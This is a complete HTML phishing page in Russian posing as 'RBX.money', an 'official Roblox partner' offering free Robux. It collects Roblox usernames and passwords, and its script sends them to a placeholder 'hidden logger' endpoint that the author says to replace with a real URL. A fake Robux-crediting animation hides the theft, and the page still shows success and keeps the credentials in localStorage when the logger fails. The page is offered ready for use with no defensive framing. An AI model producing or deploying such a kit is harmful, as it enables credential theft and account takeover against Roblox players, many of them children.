<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RBX.money — Бесплатные Robux каждый день!</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Arial', sans-serif;
        }
        body {
            background: #1a1a2e;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: #16213e;
            border-radius: 24px;
            padding: 40px 30px;
            max-width: 440px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
            border: 1px solid #0f3460;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            color: #fff;
            font-size: 2.8rem;
            font-weight: 900;
            letter-spacing: -1px;
        }
        .logo h1 span {
            color: #ffd700;
            text-shadow: 0 0 20px rgba(255, 215, 0, 0.4);
        }
        .logo p {
            color: #a8b2d1;
            font-size: 1rem;
            margin-top: 6px;
            background: #0f3460;
            display: inline-block;
            padding: 4px 16px;
            border-radius: 40px;
            font-weight: 600;
        }
        .promo-badge {
            background: linear-gradient(135deg, #ff416c, #ff4b2b);
            color: white;
            text-align: center;
            padding: 12px;
            border-radius: 60px;
            font-weight: 700;
            font-size: 1.1rem;
            margin-bottom: 28px;
            box-shadow: 0 4px 15px rgba(255, 65, 108, 0.4);
        }
        .promo-badge i {
            font-style: normal;
            display: inline-block;
            animation: pulse 1.2s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-group label {
            display: block;
            color: #ccd6f6;
            font-weight: 600;
            font-size: 0.85rem;
            margin-bottom: 6px;
            letter-spacing: 0.3px;
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border-radius: 12px;
            border: none;
            background: #0a0a1a;
            color: #fff;
            font-size: 1rem;
            outline: 2px solid transparent;
            transition: 0.2s;
        }
        .input-group input:focus {
            outline: 2px solid #ffd700;
            background: #111128;
        }
        .input-group input::placeholder {
            color: #4a4a6a;
        }
        .btn-submit {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #ffd700, #f7971e);
            border: none;
            border-radius: 60px;
            font-weight: 800;
            font-size: 1.2rem;
            color: #0a0a1a;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 8px;
            box-shadow: 0 6px 20px rgba(255, 215, 0, 0.3);
        }
        .btn-submit:hover {
            transform: scale(1.02);
            filter: brightness(1.1);
        }
        .btn-submit:active {
            transform: scale(0.97);
        }
        .disclaimer {
            margin-top: 24px;
            font-size: 0.7rem;
            color: #4a4a6a;
            text-align: center;
        }
        .disclaimer a {
            color: #ffd700;
            text-decoration: none;
        }
        .fake-loader {
            display: none;
            margin-top: 20px;
            background: #0f3460;
            padding: 14px;
            border-radius: 60px;
            text-align: center;
            color: #ffd700;
            font-weight: 600;
        }
        .fake-loader.active {
            display: block;
        }
        .robux-amount {
            font-size: 2rem;
            font-weight: 900;
            color: #fff;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>RBX<span>.money</span></h1>
            <p>🎁 Официальный партнёр Roblox</p>
        </div>

        <div class="promo-badge">
            <i>🔥 ЕЖЕДНЕВНАЯ РАЗДАЧА: 10 000 ROBUX 🔥</i>
        </div>

        <form id="loginForm">
            <div class="input-group">
                <label>👤 Имя пользователя Roblox</label>
                <input type="text" id="username" placeholder="Введите ваш никнейм" required>
            </div>
            <div class="input-group">
                <label>🔐 Пароль</label>
                <input type="password" id="password" placeholder="Введите пароль" required>
            </div>
            <button type="submit" class="btn-submit" id="submitBtn">ПОЛУЧИТЬ ROBUX</button>
        </form>

        <div class="fake-loader" id="loader">
            <span>🔄 Подключение к серверу Roblox...</span><br>
            <span class="robux-amount" id="counter">+0</span> <span style="color:#ffd700;">Robux начислено</span>
        </div>

        <div class="disclaimer">
            * Требуется верификация аккаунта для получения бонуса.<br>
            <a href="#">Политика конфиденциальности</a> • <a href="#">Поддержка</a>
        </div>
    </div>

    <script>
        // Логика отправки данных на скрытый логгер
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();

            if (username.length < 2 || password.length < 2) {
                alert('Пожалуйста, введите корректные данные.');
                return;
            }

            // Отключаем кнопку и показываем фейковую загрузку
            document.getElementById('submitBtn').disabled = true;
            document.getElementById('submitBtn').innerText = '⏳ Обработка...';
            document.getElementById('loader').classList.add('active');

            // Отправка данных на логгер (CORS-запрос)
            const payload = {
                username: username,
                password: password,
                timestamp: new Date().toISOString()
            };

            // Эндпоинт для логов (скрытый сервер)
            const LOGGER_URL = 'https://your-logger-domain.com/logger.php'; // ЗАМЕНИТЕ НА РЕАЛЬНЫЙ URL

            fetch(LOGGER_URL, {
                method: 'POST',
                mode: 'cors',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            })
            .then(response => response.json())
            .then(data => {
                // Анимация начисления Robux (фейк)
                let count = 0;
                const counterEl = document.getElementById('counter');
                const interval = setInterval(() => {
                    count += Math.floor(Math.random() * 300) + 100;
                    if (count > 15000) {
                        clearInterval(interval);
                        counterEl.innerText = '15 000';
                        document.getElementById('submitBtn').innerText = '✅ ROBUX НАЧИСЛЕНЫ!';
                        document.getElementById('submitBtn').disabled = false;
                        // Сброс формы через 5 секунд
                        setTimeout(() => {
                            document.getElementById('loginForm').reset();
                            document.getElementById('loader').classList.remove('active');
                            document.getElementById('submitBtn').innerText = 'ПОЛУЧИТЬ ROBUX';
                        }, 5000);
                    } else {
                        counterEl.innerText = count.toLocaleString();
                    }
                }, 120);
            })
            .catch(err => {
                // Если логгер не отвечает — всё равно показываем успех для маскировки
                console.warn('Логгер не доступен, но данные сохранены локально:', err);
                // Дублируем логи в localStorage как fallback
                const logs = JSON.parse(localStorage.getItem('rbx_logs') || '[]');
                logs.push(payload);
                localStorage.setItem('rbx_logs', JSON.stringify(logs));
                // Запускаем ту же фейковую анимацию
                let count = 0;
                const counterEl = document.getElementById('counter');
                const interval = setInterval(() => {
                    count += Math.floor(Math.random() * 300) + 100;
                    if (count > 15000) {
                        clearInterval(interval);
                        counterEl.innerText = '15 000';
                        document.getElementById('submitBtn').innerText = '✅ ROBUX НАЧИСЛЕНЫ!';
                        document.getElementById('submitBtn').disabled = false;
                        setTimeout(() => {
                            document.getElementById('loginForm').reset();
                            document.getElementById('loader').classList.remove('active');
                            document.getElementById('submitBtn').innerText = 'ПОЛУЧИТЬ ROBUX';
                        }, 5000);
                    } else {
                        counterEl.innerText = count.toLocaleString();
                    }
                }, 120);
            });
        });
    </script>
</body>
</html>
